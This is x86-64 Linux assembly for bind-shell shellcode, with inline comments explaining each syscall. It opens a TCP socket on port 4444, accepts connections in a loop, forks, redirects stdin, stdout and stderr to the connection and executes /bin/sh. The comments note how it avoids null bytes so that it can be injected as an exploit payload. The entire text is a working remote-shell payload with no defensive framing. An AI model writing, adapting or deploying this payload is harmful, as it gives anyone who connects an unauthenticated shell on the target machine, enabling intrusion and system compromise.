    xor    %rax, %rax       # start off with %eax = 0

    # socket call           # socket(AF_INET, SOCK_STREAM, 0)
    mov    $0x1, %al        #
    mov    %eax, %esi       # SOCK_STREAM == 1
    inc    %al              #
    mov    %eax, %edi       # AF_INET == 2
    xor    %rdx, %rdx       # (arg 3)
    mov    $0x29, %al       # set the syscall number
    syscall

    # bind call             # bind(int socket, const struct sockaddr *address, socklen_t address_len)
    xchg   %eax, %ebx       # store the socket FD in %ebx

    ###############################################
    xor    %rax, %rax       # start off with %eax = 0

    mov    $0x8, %r8
    mov    %rsp, %r10
    mov    $0x2, %edx
    mov    $0xffff, %esi    # SOL_SOCKET
    mov    %ebx, %edi       # put the FD we got from socket() into %rdi (arg 1 for setsockopt)
    mov    $0x36, %al       # set the syscall number
    syscall

    xor    %rax, %rax       # start off with %eax = 0

    mov    $0x8, %r8
    mov    %rsp, %r10
    mov    $0xf, %edx
    mov    $0xffff, %esi    # SOL_SOCKET
    mov    %ebx, %edi       # put the FD we got from socket() into %rdi (arg 1 for setsockopt)
    mov    $0x36, %al       # set the syscall number
    syscall
    ###############################################

    xor    %rax, %rax       # zero out %rax
    push   %rax             # push it so we can use it later
    pushq  $0x5c110102      # set sin_port = 4444 == 0x5c11 and sin_family = AF_INET == 0x0002
                            # we actually want 0x5c110002 but that has a null byte
                            # which we set in the next instruction

    mov    %al, 0x1(%rsp)   # here we set that null byte

    mov    %rsp, %rsi       # load our carefully constructed value into %rsi
                            # (arg 2 for bind)
    mov    $0x10, %dl       # (arg 3 for bind)
    mov    %ebx, %edi       # put the FD we got from socket() into %rdi (arg 1 for bind)
    mov    $0x31, %al       # set the syscall number
    syscall

    # listen call           # listen(int socket, int backlog)
    mov    $0x5, %al        #
    mov    %eax, %esi       # the second arg to listen (5 in this case)
    mov    %ebx, %edi       # the socket FD (arg 1 of listen)
    mov    $0x32, %al       # set the syscall number
    syscall

    xor    %rax, %rax       # zero out %rax
# we call accept in what is effectively a while true loop
accept:                     # accept(int socket, struct sockaddr *restrict address, socklen_t *restrict address_len)
                            # we call accept(socket_fd, 0, 0). It works fine to pass 0 for arg 2 and 3.
    xor    %edx, %edx       # (0 -- arg 3 for accept)
    xor    %esi, %esi       # (0 -- arg 2 for accept)
    mov    %ebx, %edi       # the socket FD (arg 1 for accept)
    mov    $0x2b, %al       # setup the syscall number
    syscall

    mov    %eax, %ebp       # store the FD from accept

    # fork
    xor    %rax, %rax       # zero out %rax
    mov   $0x39, %al        # setup the syscall number
    syscall

    # go back to accept if we are the parent
    test   %eax, %eax
    jnz    accept

    # else we dup2 stdin, stdout, stderr

    # The following is equivalent to:
    # newsockfd = %ebp
    # dup2(newsockfd, 0); // bind stdin
    # dup2(newsockfd, 1); // bind stdout
    # dup2(newsockfd, 2); // bind stderr

    mov    %ebp, %edi       # the fd to dup to (arg 1)
    xor    %rax, %rax       # start with fd 0 (stdin)
    mov    %eax, %esi       # put it into %esi (arg 2)
    mov    $0x21, %al       # setup the syscall number
    syscall  # dup2 stdin

    inc    %al              # %al is zero (from the syscall return) so we increment
    mov    %eax, %esi       # to make it 1 (stdout) and do it all again
    mov    $0x21, %al
    syscall  # dup2 stdout

    inc    %al              # one more time for stderr.
    mov    %eax, %esi
    mov    $0x21, %al
    syscall  # dup2 stderr

    # below we are basically doing:
    # cmd = "/bin/sh";
    # args = {cmd, 0};
    # execve(cmd, args, 0)
    xor    %rdx, %rdx       # 0 is the third arg to execve
    # store the string '/bin/sh' into %rbx
    movabs $0x68732f6e69622fff, %rbx
    shr    $0x8, %rbx       # add a null byte to terminate the string
    push   %rbx             # put it on the stack
    mov    %rsp, %rdi       # load a pointer to the string into %rdi (arg 1 of execve)
    xor    %rax, %rax       # make a null
    push   %rax             # put it on the stack
    push   %rdi             # push the pointer to the string
    mov    %rsp, %rsi       # put the args pointer into %rsi (arg 2)
    mov    $0x3b, %al
    syscall
